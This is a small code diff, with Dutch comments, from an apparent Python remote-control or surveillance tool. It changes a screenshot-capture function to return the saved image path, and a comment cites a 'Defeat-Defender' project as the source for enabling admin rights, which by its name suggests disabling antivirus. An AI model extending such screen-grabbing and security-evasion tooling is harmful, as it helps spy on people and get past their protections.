@@ -121,7 +121,7 @@ def get_screen():
     screenshot = ImageGrab.grab()
     screenshot.save(imagePath, "PNG")
 
-    return "screenshot gemaakt"
+    return imagePath
 
 # functie om admin rechten aan te zetten
 # Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
